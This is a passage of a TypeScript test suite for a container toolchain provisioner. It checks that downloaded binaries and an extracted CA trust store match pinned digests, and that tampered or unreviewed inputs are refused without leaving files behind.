/**
 * The container toolchain is what replaced a private image nobody could pull,
 * and it assembles a trust store and an executable from the public internet.
 * Five properties matter more than the rest, and each is written here to fail
 * loudly if it regresses.
 *
 * 1. An operator who names an image owns it. `spec.image` and
 *    `OMPD_CONTAINER_IMAGE` short-circuit everything: no download, no CA
 *    extraction, no manifest lookup, nothing mounted over their image. The
 *    assertions check the recorded argv list is empty and the injected fetcher
 *    was never called, because "we did not run anything" is the actual claim.
 *    An unreviewed omp version has to keep working on that path, since it is
 *    the documented way out of the refusals below.
 * 2. Nothing unreviewed is ever mounted. Every byte on the default path is
 *    checked against `toolchain-manifest.ts` before it is used: the omp release
 *    by digest and byte count, the trust store by digest, the images by pinned
 *    digest in the reference itself. An omp version or architecture with no
 *    entry is refused with the steps to add one, and never downloaded.
 * 3. The trust store is verified on every path, not only when it is written.
 *    This is the reviewer's finding and it has its own describe block. A hit
 *    used to check `omp` (whose digest names the directory) and byte-compare the
 *    shim, and never look at `ca-certificates.crt`, so a rewritten trust store
 *    read as a clean hit and got mounted with `SSL_CERT_FILE` pointed at it.
 * 4. A cache entry that fails verification is moved aside, never written into,
 *    and the bytes that failed are never the ones reported as resolved.
 * 5. A failure leaves nothing behind. A download that disagrees with the
 *    manifest must not leave a half-populated toolchain, or a staging directory,
 *    that a later run could treat as real.
 *
 * No container runtime and no network is touched: the runtime is a
 * `CommandRunner` this file supplies and the release asset is an injected
 * fetcher.
 *
 * Two things are deliberately real rather than fabricated. The CA bundle is the
 * committed fixture pulled out of the pinned alpine layer, so the test proves
 * `CA_BUNDLE_SHA256` describes an actual file rather than proving a constant
 * equals itself. And `orbstack-development-root-ca.pem` is the 771 bytes
 * OrbStack's docker really appends, so the tamper test reproduces a defect that
 * happened rather than one imagined for the occasion.
 *
 * The omp bytes cannot be real: the reviewed digests describe a 145MB binary.
 * So the successful-provision tests inject a `releases` manifest of their own
 * (see `TEST_RELEASE`), and every fail-closed test runs against the real
 * `OMP_RELEASES` where it counts.
 */

import { afterEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { chmodSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { HostSpec } from "@ompd/core";
import {
  CA_SOURCE_IMAGE,
  DEFAULT_BASE_IMAGE,
  ensureToolchain,
  renderOmpHomeShim,
  TOOLCHAIN_MOUNT_PATH,
  toolchainDir,
} from "../src/provisioner/image.ts";
import { capabilityFromHelp, type RuntimeCapability } from "../src/provisioner/runtime.ts";
import {
  BASE_IMAGE,
  CA_BUNDLE_BYTES,
  CA_BUNDLE_CERT_COUNT,
  CA_BUNDLE_ORBSTACK_SHA256,
  CA_BUNDLE_SHA256,
  CA_PEM_HEADER,
  CA_SOURCE_IMAGE_PIN,
  OMP_RELEASES,
  type OmpRelease,
} from "../src/provisioner/toolchain-manifest.ts";
import type { CommandResult, CommandRunner } from "../src/provisioner/types.ts";
import { ProvisionError } from "../src/provisioner/types.ts";

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

const FIXTURES = join(import.meta.dir, "fixtures", "ca-bundle");

/**
 * The reviewed trust store, as committed. Read rather than synthesised so the
 * happy path is checked against `CA_BUNDLE_SHA256` and not against itself.
 */
const CA_PEM = readFileSync(join(FIXTURES, "alpine-3.20-ca-certificates.crt"), "utf8");
const CA_SHA = createHash("sha256").update(new TextEncoder().encode(CA_PEM)).digest("hex");

/** The certificate OrbStack's docker injects, byte for byte. */
const ORBSTACK_CA = readFileSync(join(FIXTURES, "orbstack-development-root-ca.pem"), "utf8");

const OMP_BYTES = new TextEncoder().encode("#!/fake-elf\nomp payload\n");
const OMP_SHA = createHash("sha256").update(OMP_BYTES).digest("hex");

/**
 * A reviewed release standing in for the real one, since the real digests
 * describe 145MB of binary.
 *
 * The version deliberately carries a `-test` suffix, so a test can never
 * accidentally assert against, or be satisfied by, the genuine 18.0.4 entry in
 * `OMP_RELEASES`.
 */
const TEST_RELEASE: OmpRelease = {
  version: "18.0.4-test",
  arch: "arm64",
  sha256: OMP_SHA,
  bytes: OMP_BYTES.byteLength,
  url: "https://github.com/can1357/oh-my-pi/releases/download/v18.0.4-test/omp-linux-arm64",
};

/** A second reviewed entry, for the "another version does not collide" case. */
const TEST_RELEASE_NEXT: OmpRelease = { ...TEST_RELEASE, version: "18.0.5-test" };

const TEST_RELEASES: readonly OmpRelease[] = [TEST_RELEASE, TEST_RELEASE_NEXT];

const SPEC: HostSpec = { kind: "container" };

const cleanups: Array<() => void> = [];

afterEach(() => {
  while (cleanups.length) cleanups.pop()?.();
});

function tempDir(prefix: string): string {
  const path = mkdtempSync(join(tmpdir(), prefix));
  cleanups.push(() => rmSync(path, { recursive: true, force: true }));
  return path;
}

interface Harness {
  /** Every command the module ran, in order. */
  argv: string[][];
  run: CommandRunner;
  /** Every URL the module asked for. */
  fetched: string[];
  fetchAsset: (url: string) => Promise<Uint8Array>;
}

interface HarnessOptions {
  /** What `omp --version` prints. */
  version?: string;
  versionCode?: number;
  /** What the CA extraction gets on stdout. */
  ca?: string;
  caCode?: number;
  /** Release bytes, or an error to reject with. */
  omp?: Uint8Array;
  downloadError?: Error;
  /**
   * Make the runtime unprobeable, so a caller that hands in no capability is
   * refused rather than run unconfined.
   */
  helpCode?: number;
}

/**
 * Real `run --help` output, per runtime, from the committed fixtures.
 *
 * The extraction confines itself with the flags the binary declares, so it
 * probes the runtime when a caller hands in no capability. Answering that probe
 * with fabricated help would make every confinement assertion downstream a
 * statement about this file rather than about the binary, so the same three
 * captures `container-runtime.test.ts` holds the parser to are used here.
 */
const RUN_HELP: Record<string, string> = {
  container: readFileSync(join(import.meta.dir, "fixtures", "runtime-help", "apple-container-0.4.1.txt"), "utf8"),
  docker: readFileSync(join(import.meta.dir, "fixtures", "runtime-help", "docker-29.4.0.txt"), "utf8"),
  podman: readFileSync(join(import.meta.dir, "fixtures", "runtime-help", "podman-4.8.2.txt"), "utf8"),
};

/** What each runtime's liveness check is, and what `probeRuntime` looks for in it. */
const LIVENESS: Record<string, { argv: string; stdout: string }> = {
  container: { argv: "system status", stdout: "apiserver is running\n" },
  docker: { argv: "info", stdout: "Server Version: 29.4.0\n" },
  podman: { argv: "info", stdout: "host:\n" },
};

const RUNTIME_VERSION: Record<string, string> = {
  container: "container CLI version 0.4.1 (build: release, commit: 4ac18b5)\n",
  docker: "Docker version 29.4.0, build 1a2b3c4\n",
  podman: "podman version 4.8.2\n",
};

function harness(opts: HarnessOptions = {}): Harness {
  const argv: string[][] = [];
  const fetched: string[] = [];
  return {
    argv,
    fetched,
    run: async (command: string[]): Promise<CommandResult> => {
      argv.push([...command]);
      const runtime = command[0] ?? "";
      const rest = command.slice(1);
      if (runtime === "omp" && rest[0] === "--version") {
        return { code: opts.versionCode ?? 0, stdout: opts.version ?? "omp/18.0.4-test\n", stderr: "" };
      }
      if (command.includes("cat")) {
        return { code: opts.caCode ?? 0, stdout: opts.ca ?? CA_PEM, stderr: opts.caCode === 0 ? "" : "boom" };
      }
      // The three commands `probeRuntime` issues, in the order it issues them.
      if (rest.length === 1 && rest[0] === "--version") {
        return { code: 0, stdout: RUNTIME_VERSION[runtime] ?? "", stderr: "" };
      }
      const liveness = LIVENESS[runtime];
      if (liveness !== undefined && rest.join(" ") === liveness.argv) {
        return { code: 0, stdout: liveness.stdout, stderr: "" };
      }
      if (rest[0] === "run" && rest[1] === "--help") {
        // A non-zero `run --help` is `unverifiable` rather than an all-false
        // capability: a failed command can still print a full option list, and
        // trusting one reports every confinement flag as available.
        const code = opts.helpCode ?? 0;
        if (code !== 0) return { code, stdout: "", stderr: "help exploded" };
        return { code: 0, stdout: RUN_HELP[runtime] ?? "", stderr: "" };
      }
      // Network create and rm, and anything else the extraction wraps its run in.
      return { code: 0, stdout: "", stderr: "" };
    },
    fetchAsset: async (url: string): Promise<Uint8Array> => {
      fetched.push(url);
      if (opts.downloadError !== undefined) throw opts.downloadError;
      return opts.omp ?? OMP_BYTES;
    },
  };
}

/**
 * The capability a runtime really reports, derived from its committed
 * `run --help` rather than written out by hand.
 *
 * Hand-writing these was the alternative and it is the trap: the confinement
 * assertions below name specific flags, and a fabricated capability would make
 * them a statement about this file. Deriving them through the same
 * `capabilityFromHelp` the daemon uses means "Apple sends no `--cap-drop`" is a
 * fact about `container` 0.4.1's own help text.
 *
 * The three recorded overrides are applied exactly as `probeRuntime` applies
 * them, because they are the fields no help text can answer. For `container`
 * that is what makes `numericUser` false, which matters here: every numeric
 * identity flag crashes that runtime with `XPC connection error: Connection
 * interrupted`, so an extraction that sent one would not be confined, it would
 * be broken.
 */
function capabilityOf(runtime: string): RuntimeCapability {
  const capability = capabilityFromHelp(runtime, (RUNTIME_VERSION[runtime] ?? "").trim(), RUN_HELP[runtime] ?? "");
  if ("reason" in capability) throw new Error(`the ${runtime} help fixture is unusable: ${capability.hint}`);
  return runtime === "container"
    ? { ...capability, tmpfsOptions: false, networkNone: false, numericUser: false }
    : capability;
}

const APPLE_CAP = capabilityOf("container");
const DOCKER_CAP = capabilityOf("docker");

/**
 * A default-path provision against the injected test manifest.
 *
 * The capability is handed in by default, because that is what the daemon does:
 * `container.ts` computes it from `selectRuntime` and passes it, as does
 * `scripts/check-cowork-thin-path.ts`. Leaving it out here would mean the bulk
 * of the suite exercised the probe fallback instead of the path that ships. The
 * fallback has its own two tests rather than being the default.
 */
function provision(
  h: Harness,
  cacheRoot: string,
  over: {
    version?: string;
    arch?: string;
    onLog?: (line: string) => void;
    capability?: RuntimeCapability | null;
  } = {},
) {
  const capability = over.capability === undefined ? APPLE_CAP : (over.capability ?? undefined);
  return ensureToolchain({
    runtime: capability?.runtime ?? "container",
    capability,
    spec: SPEC,
    run: h.run,
    cacheRoot,
    ompVersion: over.version ?? TEST_RELEASE.version,
    arch: over.arch ?? TEST_RELEASE.arch,
    releases: TEST_RELEASES,
    fetchAsset: h.fetchAsset,
    onLog: over.onLog,
  });
}

/** Every network the extraction created, and every one it removed. */
function networkOps(argv: string[][]): { created: string[]; removed: string[] } {
  const of = (verb: string): string[] => argv.filter(c => c[1] === "network" && c[2] === verb).map(c => c[3] ?? "");
  return { created: of("create"), removed: of("rm") };
}

/** Make a landed file writable, overwrite it, and restore the mode. Landed files are read-only on purpose. */
function tamper(path: string, contents: string): void {
  chmodSync(path, 0o644);
  writeFileSync(path, contents);
  chmodSync(path, 0o444);
}

// ---------------------------------------------------------------------------
// toolchainDir is pure
// ---------------------------------------------------------------------------

describe("toolchainDir", () => {
  test("names the directory after version, arch, and the binary's digest", () => {
    expect(toolchainDir("/cache", { ompVersion: "18.0.4", arch: "arm64" }, OMP_SHA)).toBe(
      `/cache/omp-18.0.4-arm64-${OMP_SHA.slice(0, 12)}`,
    );
  });

  test("is stable across calls", () => {
    const inputs = { ompVersion: "18.0.4", arch: "arm64" };
    expect(toolchainDir("/cache", inputs, OMP_SHA)).toBe(toolchainDir("/cache", inputs, OMP_SHA));
  });

  test("changes when any single input changes", () => {
    const base = toolchainDir("/cache", { ompVersion: "18.0.4", arch: "arm64" }, OMP_SHA);
    const others = [
      toolchainDir("/other", { ompVersion: "18.0.4", arch: "arm64" }, OMP_SHA),
      toolchainDir("/cache", { ompVersion: "18.0.5", arch: "arm64" }, OMP_SHA),
      toolchainDir("/cache", { ompVersion: "18.0.4", arch: "x64" }, OMP_SHA),
      toolchainDir("/cache", { ompVersion: "18.0.4", arch: "arm64" }, CA_SHA),
    ];
    for (const other of others) expect(other).not.toBe(base);
    // And each is distinct from the others, not merely from the base.
    expect(new Set(others).size).toBe(others.length);
  });
});

// ---------------------------------------------------------------------------
// The manifest is the reviewed record, and it describes reality
// ---------------------------------------------------------------------------

describe("the toolchain manifest", () => {
  test("pins both public images by digest, not by a mutable tag", () => {
    for (const pin of [BASE_IMAGE, CA_SOURCE_IMAGE_PIN]) {
      expect(pin.digest).toMatch(/^sha256:[0-9a-f]{64}$/);
      // The digest has to be in the reference, because the reference is what
      // reaches argv. A digest recorded beside a bare tag would pin nothing.
      expect(pin.ref).toContain(`@${pin.digest}`);
      expect(pin.ref).toMatch(/^[a-z0-9]+:[a-z0-9.-]+@sha256:[0-9a-f]{64}$/);
    }
  });

  test("the images the module actually uses are the pinned ones", () => {
    expect(DEFAULT_BASE_IMAGE).toBe(BASE_IMAGE.ref);
    expect(CA_SOURCE_IMAGE).toBe(CA_SOURCE_IMAGE_PIN.ref);
    expect(DEFAULT_BASE_IMAGE).toContain("@sha256:");
    expect(CA_SOURCE_IMAGE).toContain("@sha256:");
  });

  test("every reviewed release carries a full digest, a byte count, and a matching url", () => {
    expect(OMP_RELEASES.length).toBeGreaterThan(0);
    for (const release of OMP_RELEASES) {
      expect(release.sha256).toMatch(/^[0-9a-f]{64}$/);
      expect(release.bytes).toBeGreaterThan(1_000_000);
      // The url has to name the same version and arch the entry claims, or the
      // digest is checked against a different asset than the one requested.
      expect(release.url).toBe(
        `https://github.com/can1357/oh-my-pi/releases/download/v${release.version}/omp-linux-${release.arch}`,
      );
    }
  });

  test("the reviewed 18.0.4 releases are the ones upstream published", () => {
    // Straight from that tag's SHA256SUMS.txt asset and the release API, so an
    // edit to either constant has to be deliberate.
    expect(OMP_RELEASES.find(r => r.version === "18.0.4" && r.arch === "arm64")).toEqual({
      version: "18.0.4",
      arch: "arm64",
      sha256: "f2b7c8a019681ede314ac165100c1c5b5cd4900139075948da809c004bec5ce7",
      bytes: 145082360,
      url: "https://github.com/can1357/oh-my-pi/releases/download/v18.0.4/omp-linux-arm64",
    });
    expect(OMP_RELEASES.find(r => r.version === "18.0.4" && r.arch === "x64")).toEqual({
      version: "18.0.4",
      arch: "x64",
      sha256: "94ec42d17d71975a381e20335bb3c005a7fd7eec19b319358df6d22f28e16b37",
      bytes: 179881160,
      url: "https://github.com/can1357/oh-my-pi/releases/download/v18.0.4/omp-linux-x64",
    });
  });

  test("the committed fixture is exactly the trust store the manifest pins", () => {
    // The test that stops `CA_BUNDLE_SHA256` from being a constant compared
    // against itself. The fixture was unpacked from the arm64 layer of the
    // pinned alpine index, straight from the registry, and the amd64 layer gave
    // identical bytes.
    expect(CA_SHA).toBe(CA_BUNDLE_SHA256);
    expect(new TextEncoder().encode(CA_PEM).byteLength).toBe(CA_BUNDLE_BYTES);
    expect(CA_PEM.split(CA_PEM_HEADER).length - 1).toBe(CA_BUNDLE_CERT_COUNT);
    expect(CA_PEM.startsWith(CA_PEM_HEADER)).toBe(true);
  });

  test("the OrbStack fixture is one appended certificate, and reproduces what docker returned", () => {
    // Recorded on this machine: `docker run --rm alpine:3.20@<pinned index>
    // cat /etc/ssl/certs/ca-certificates.crt` gave 218540 bytes and 146
    // certificates, and the reviewed bundle is a byte-exact prefix of it.
    const injected = CA_PEM + ORBSTACK_CA;
    expect(injected.split(CA_PEM_HEADER).length - 1).toBe(CA_BUNDLE_CERT_COUNT + 1);
    expect(new TextEncoder().encode(injected).byteLength).toBe(218540);
    expect(createHash("sha256").update(new TextEncoder().encode(injected)).digest("hex")).toBe(
      CA_BUNDLE_ORBSTACK_SHA256,
    );
    expect(ORBSTACK_CA).toContain(CA_PEM_HEADER);
  });
});

// ---------------------------------------------------------------------------
// Operator-named images short-circuit everything
// ---------------------------------------------------------------------------

describe("a named image", () => {
  test("spec.image is used untouched, and nothing is run or downloaded", async () => {
    const h = harness();
    const resolved = await ensureToolchain({
      runtime: "container",
      spec: { kind: "container", image: "ghcr.io/acme/omp:1" },
      run: h.run,
      cacheRoot: tempDir("ompd-cache-"),
      fetchAsset: h.fetchAsset,
    });

    expect(resolved).toEqual({
      image: "ghcr.io/acme/omp:1",
      source: "spec",
      toolsDir: null,
      mountPath: TOOLCHAIN_MOUNT_PATH,
      ompPath: "omp",
      env: {},
      ompSha256: null,
      caSha256: null,
      cached: false,
    });
    expect(h.argv).toEqual([]);
    expect(h.fetched).toEqual([]);
  });

  test("envImage is used when spec.image is absent", async () => {
    const h = harness();
    const resolved = await ensureToolchain({
      runtime: "docker",
      spec: SPEC,
      run: h.run,
      cacheRoot: tempDir("ompd-cache-"),
      envImage: "ghcr.io/acme/omp:env",
      fetchAsset: h.fetchAsset,
    });

    expect(resolved.image).toBe("ghcr.io/acme/omp:env");
    expect(resolved.source).toBe("env");
    expect(resolved.toolsDir).toBeNull();
    expect(h.argv).toEqual([]);
    expect(h.fetched).toEqual([]);
  });

  test("spec.image beats envImage", async () => {
    const h = harness();
    const resolved = await ensureToolchain({
      runtime: "docker",
      spec: { kind: "container", image: "ghcr.io/acme/omp:spec" },
      run: h.run,
      cacheRoot: tempDir("ompd-cache-"),
      envImage: "ghcr.io/acme/omp:env",
      fetchAsset: h.fetchAsset,
    });

    expect(resolved.image).toBe("ghcr.io/acme/omp:spec");
    expect(resolved.source).toBe("spec");
  });

  test("a named image needs no manifest entry, on either channel", async () => {
    // The operator-owned path is the documented way out of both refusals below
    // (an unreviewed omp, and a runtime that rewrites the trust store), so it
    // has to keep working for a version the manifest has never heard of. If
    // this test ever needs a manifest entry to pass, that exit has closed.
    for (const [key, image] of [
      ["spec", "ghcr.io/acme/omp:unreviewed"],
      ["env", "ghcr.io/acme/omp:unreviewed-env"],
    ] as const) {
      const h = harness();
      const cacheRoot = tempDir("ompd-cache-");
      const resolved = await ensureToolchain({
        runtime: "container",
        spec: key === "spec" ? { kind: "container", image } : SPEC,
        envImage: key === "env" ? image : undefined,
        run: h.run,
        cacheRoot,
        ompVersion: "99.99.99-never-reviewed",
        arch: "sparc",
        fetchAsset: h.fetchAsset,
      });

      expect(resolved.image).toBe(image);
      expect(resolved.source).toBe(key);
      expect(resolved.toolsDir).toBeNull();
      expect(resolved.env).toEqual({});
      expect(h.argv).toEqual([]);
      expect(h.fetched).toEqual([]);
      expect(readdirSync(cacheRoot)).toEqual([]);
    }
  });

  test("a whitespace-only image counts as unset, so the default still works", async () => {
    const h = harness();
    const resolved = await ensureToolchain({
      runtime: "container",
      spec: { kind: "container", image: "   " },
      run: h.run,
      cacheRoot: tempDir("ompd-cache-"),
      envImage: "\n",
      ompVersion: TEST_RELEASE.version,
      arch: TEST_RELEASE.arch,
      releases: TEST_RELEASES,
      fetchAsset: h.fetchAsset,
    });

    expect(resolved.source).toBe("default");
    expect(resolved.image).toBe(DEFAULT_BASE_IMAGE);
  });
});

// ---------------------------------------------------------------------------
// The default path: populate the cache
// ---------------------------------------------------------------------------

describe("populating the toolchain cache", () => {
  test("downloads the release, extracts a CA bundle, and lands all three files", async () => {
    const h = harness();
    const cacheRoot = tempDir("ompd-cache-");
    const resolved = await provision(h, cacheRoot);

    expect(resolved.source).toBe("default");
    expect(resolved.image).toBe(DEFAULT_BASE_IMAGE);
    expect(resolved.cached).toBe(false);
    expect(resolved.ompSha256).toBe(OMP_SHA);
    expect(resolved.caSha256).toBe(CA_BUNDLE_SHA256);
    expect(resolved.toolsDir).toBe(
      toolchainDir(cacheRoot, { ompVersion: TEST_RELEASE.version, arch: TEST_RELEASE.arch }, OMP_SHA),
    );
    expect(resolved.mountPath).toBe(TOOLCHAIN_MOUNT_PATH);

    // The entrypoint is the shim, not the binary: the shim is what picks up an
    // OMP home seeded on the workspace mount.
    expect(resolved.ompPath).toBe(`${TOOLCHAIN_MOUNT_PATH}/omp-shim`);
    expect(resolved.env).toEqual({ SSL_CERT_FILE: `${TOOLCHAIN_MOUNT_PATH}/ca-certificates.crt` });

    const dir = resolved.toolsDir ?? "";
    expect(readFileSync(join(dir, "omp"))).toEqual(Buffer.from(OMP_BYTES));
    expect(readFileSync(join(dir, "ca-certificates.crt"), "utf8")).toBe(CA_PEM);
    expect(h.fetched).toEqual([TEST_RELEASE.url]);
  });

  test("the release url comes from the manifest, not from string assembly", async () => {
    const h = harness();
    await provision(h, tempDir("ompd-cache-"));
    expect(h.fetched).toEqual([TEST_RELEASE.url]);
  });

  test("the CA bundle is extracted from the digest-pinned image, through the runtime", async () => {
    const h = harness();
    await provision(h, tempDir("ompd-cache-"));

    // The whole command list, so an argument appearing that nobody asked for is
    // a failure rather than something the assertion tolerates. On Apple the
    // extraction is three commands: make a network, run alone in it, remove it.
    const network = networkOps(h.argv).created[0] ?? "";
    expect(h.argv).toEqual([
      ["container", "network", "create", network],
      [
        "container",
        "run",
        "--rm",
        "--network",
        network,
        "--memory",
        "256m",
        "--cpus",
        "1",
        CA_SOURCE_IMAGE,
        "cat",
        "/etc/ssl/certs/ca-certificates.crt",
      ],
      ["container", "network", "rm", network],
    ]);
    // The pin has to be in the argument the runtime resolves, not merely
    // recorded next to it.
    expect(h.argv[1]?.at(-3)).toContain(`@${CA_SOURCE_IMAGE_PIN.digest}`);
  });

  test("the landed shim execs the mounted binary, not the old image path", async () => {
    const h = harness();
    const resolved = await provision(h, tempDir("ompd-cache-"));

    const shim = readFileSync(join(resolved.toolsDir ?? "", "omp-shim"), "utf8");
    expect(shim).toContain(`exec ${TOOLCHAIN_MOUNT_PATH}/omp "$@"`);
    expect(shim).not.toContain("/usr/local/lib/omp/omp");
    // The rest of the shim is carried over, credential handling included.
    expect(shim).toContain("refusing to fall back to the image's HOME");
  });

  test("the cache directory is owner-only, holding unwritable files", async () => {
    const h = harness();
    const cacheRoot = tempDir("ompd-cache-");
    const resolved = await provision(h, cacheRoot);

    const dir = resolved.toolsDir ?? "";
    // 0700, not the 0755 this used to land. A toolchain directory another
    // account can traverse and write to makes every digest check in the module
    // a race rather than a check. Measured to still be readable from inside
    // both runtimes' guests, which map the host owner onto guest root.
    expect(statSync(dir).mode & 0o777).toBe(0o700);
    // The root too: it is where staging happens and where the rename lands, so
    // a writable root is a hole in the entry check rather than in the entry.
    expect(statSync(cacheRoot).mode & 0o777).toBe(0o700);
    expect(statSync(join(dir, "omp")).mode & 0o777).toBe(0o555);
    expect(statSync(join(dir, "omp-shim")).mode & 0o777).toBe(0o555);
    expect(statSync(join(dir, "ca-certificates.crt")).mode & 0o777).toBe(0o444);
  });

  test("no staging directory survives a successful landing", async () => {
    const h = harness();
    const cacheRoot = tempDir("ompd-cache-");
    await provision(h, cacheRoot);

    expect(readdirSync(cacheRoot).filter(entry => entry.startsWith(".staging-"))).toEqual([]);
  });

  test("resolves the version from omp --version and the arch from the option", async () => {
    const h = harness({ version: "omp/18.0.5-test\n" });
    await ensureToolchain({
      runtime: "podman",
      spec: SPEC,
      run: h.run,
      cacheRoot: tempDir("ompd-cache-"),
      arch: "arm64",
      releases: TEST_RELEASES,
      fetchAsset: h.fetchAsset,
    });

    expect(h.argv[0]).toEqual(["omp", "--version"]);
    expect(h.fetched).toEqual([TEST_RELEASE_NEXT.url]);
  });
});

// ---------------------------------------------------------------------------
// An unreviewed release is refused, never fetched
// ---------------------------------------------------------------------------

describe("an omp release with no manifest entry", () => {
  /** The real manifest, deliberately: this is the guard as it ships. */
  function unreviewed(h: Harness, cacheRoot: string, over: { version?: string; arch?: string }) {
    return ensureToolchain({
      runtime: "container",
      spec: SPEC,
      run: h.run,
      cacheRoot,
      ompVersion: over.version ?? "18.0.4",
      arch: over.arch ?? "arm64",
      fetchAsset: h.fetchAsset,
    });
  }

  test("an unknown version is refused, with no download and nothing on disk", async () => {
    const h = harness();
    const cacheRoot = tempDir("ompd-cache-");

    await expect(unreviewed(h, cacheRoot, { version: "19.1.0" })).rejects.toThrow(ProvisionError);
    await expect(unreviewed(h, cacheRoot, { version: "19.1.0" })).rejects.toThrow(
      /omp 19\.1\.0 \(linux\/arm64\) is not in the reviewed toolchain manifest/,
    );
    expect(h.fetched).toEqual([]);
    // Not even the CA extraction: the manifest lookup is ahead of every other
    // step, so a refusal costs nothing and touches nothing.
    expect(h.argv).toEqual([]);
    expect(readdirSync(cacheRoot)).toEqual([]);
  });

  test("an unknown arch is refused, with no download and nothing on disk", async () => {
    const h = harness();
    const cacheRoot = tempDir("ompd-cache-");

    await expect(unreviewed(h, cacheRoot, { arch: "riscv64" })).rejects.toThrow(
      /omp 18\.0\.4 \(linux\/riscv64\) is not in the reviewed toolchain manifest/,
    );
    expect(h.fetched).toEqual([]);
    expect(h.argv).toEqual([]);
    expect(readdirSync(cacheRoot)).toEqual([]);
  });

  test("the refusal says how to add an entry, and names the file to add it to", async () => {
    const h = harness();
    let message = "";
    try {
      await unreviewed(h, tempDir("ompd-cache-"), { version: "19.1.0" });
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    // The whole point of failing closed is that the operator is told what to do.
    expect(message).toContain("packages/daemon/src/provisioner/toolchain-manifest.ts");
    expect(message).toContain("OMP_RELEASES");
    expect(message).toContain("SHA256SUMS.txt");
    expect(message).toContain("refusing to fetch an unpinned release");
    // And what it does know about, so the operator can see whether they simply
    // have the wrong arch.
    expect(message).toContain("18.0.4 (arm64)");
    expect(message).toContain("18.0.4 (x64)");
  });

  test("the musl builds are deliberately absent, because the pinned base is glibc", () => {
    // Published upstream and intentionally not reviewed here: the base image is
    // debian-slim, and a musl binary will not run on it. If someone adds an
    // alpine base they have to add these, deliberately.
    expect(OMP_RELEASES.some(r => r.url.includes("musl"))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// A download that disagrees with the manifest
// ---------------------------------------------------------------------------

describe("a download that disagrees with the manifest", () => {
  /** Nothing landed, no staging directory, no quarantine. */
  function expectEmptyCache(cacheRoot: string): void {
    expect(readdirSync(cacheRoot)).toEqual([]);
  }

  test("a wrong digest is refused, and nothing is written to disk", async () => {
    // Same length as the reviewed bytes, so only the digest can catch it. That
    // is the substitution the byte-count check cannot see.
    const substituted = new TextEncoder().encode("#!/fake-elf\nbad payload\n");
    expect(substituted.byteLength).toBe(OMP_BYTES.byteLength);

    const h = harness({ omp: substituted });
    const cacheRoot = tempDir("ompd-cache-");

    await expect(provision(h, cacheRoot)).rejects.toThrow(/returned sha256 .*, but omp 18\.0\.4-test/);
    await expect(provision(h, cacheRoot)).rejects.toThrow(/nothing was written to disk/);
    expectEmptyCache(cacheRoot);
  });

  test("a wrong byte count is refused, and nothing is written to disk", async () => {
    const h = harness({ omp: new TextEncoder().encode("#!/fake-elf\nomp payload\nextra\n") });
    const cacheRoot = tempDir("ompd-cache-");

    await expect(provision(h, cacheRoot)).rejects.toThrow(/returned 30 bytes, but omp 18\.0\.4-test/);
    expectEmptyCache(cacheRoot);
  });

  test("a failing download throws and lands nothing", async () => {
    const h = harness({ downloadError: new Error("connection reset") });
    const cacheRoot = tempDir("ompd-cache-");

    await expect(provision(h, cacheRoot)).rejects.toThrow(ProvisionError);
    expectEmptyCache(cacheRoot);
  });

  test("an empty release body is refused rather than mounted", async () => {
    const h = harness({ omp: new Uint8Array(0) });
    const cacheRoot = tempDir("ompd-cache-");

    await expect(provision(h, cacheRoot)).rejects.toThrow(/empty body/);
    expectEmptyCache(cacheRoot);
  });
});

// ---------------------------------------------------------------------------
// The trust store is verified on every path
// ---------------------------------------------------------------------------

describe("the extracted trust store", () => {
  test("a bundle with one extra appended certificate is refused, naming the runtime and both digests", async () => {
    // The OrbStack regression, as a fixture rather than a live docker call.
    // Observed on this machine: `docker run --rm alpine:3.20@<pinned index> cat
    // /etc/ssl/certs/ca-certificates.crt` returns the reviewed bundle plus
    // OrbStack's own development root CA, so the runtime is editing the trust
    // store between the pinned image and stdout. That file becomes
    // SSL_CERT_FILE for every model call the host makes, which makes an
    // unreviewed CA in it an interception capability over the agent's traffic.
    //
    // Named because it is the guard someone will eventually decide is too
    // strict. It is not: the image is pinned by digest, so a bundle that
    // differs cannot be the image having changed.
    const h = harness({ ca: CA_PEM + ORBSTACK_CA });
    const cacheRoot = tempDir("ompd-cache-");

    let message = "";
    await expect(provision(h, cacheRoot)).rejects.toThrow(ProvisionError);
    try {
      await provision(h, cacheRoot);
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    // The runtime that did it, by name.
    expect(message).toContain("the CA bundle container extracted from");
    expect(message).toContain(CA_SOURCE_IMAGE);
    // Both digests, so the operator can compare them without re-deriving either.
    expect(message).toContain(CA_BUNDLE_ORBSTACK_SHA256);
    expect(message).toContain(CA_BUNDLE_SHA256);
    // And the cheap diagnosis that makes it obvious what happened.
    expect(message).toContain("218540 bytes, 146 certificates");
    expect(message).toContain(`${CA_BUNDLE_BYTES} bytes, ${CA_BUNDLE_CERT_COUNT} certificates`);
    expect(message).toContain("OrbStack Development Root CA");

    // Refused before the download, and with nothing left behind.
    expect(h.fetched).toEqual([]);
    expect(readdirSync(cacheRoot)).toEqual([]);
  });

  test("the refusal names all three ways forward", async () => {
    const h = harness({ ca: CA_PEM + ORBSTACK_CA });
    let message = "";
    try {
      await provision(h, tempDir("ompd-cache-"));
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }

    // Correct is not enough; an operator hitting this needs an exit.
    expect(message).toContain("Apple's `container`");
    expect(message).toContain("OMPD_CONTAINER_IMAGE");
    expect(message).toContain("spec.image");
    expect(message).toContain("CA_BUNDLE_SHA256");
    expect(message).toContain("packages/daemon/src/provisioner/toolchain-manifest.ts");
  });

  test("a single removed certificate is refused too, not only an added one", async () => {
    // Both directions matter. A stripped root is how TLS to one provider starts
    // failing in a way nobody traces back to the toolchain.
    const stripped = CA_PEM.slice(0, CA_PEM.lastIndexOf(CA_PEM_HEADER));
    expect(stripped.split(CA_PEM_HEADER).length - 1).toBe(CA_BUNDLE_CERT_COUNT - 1);

    const h = harness({ ca: stripped });
    await expect(provision(h, tempDir("ompd-cache-"))).rejects.toThrow(/is not the reviewed one/);
    expect(h.fetched).toEqual([]);
  });

  test("a short or non-PEM bundle is refused before any download, and says so plainly", async () => {
    // A distinct message from the digest mismatch on purpose: a runtime that
    // printed 42 conversational bytes should be told it did not return a
    // bundle, not handed two lines of hex to compare.
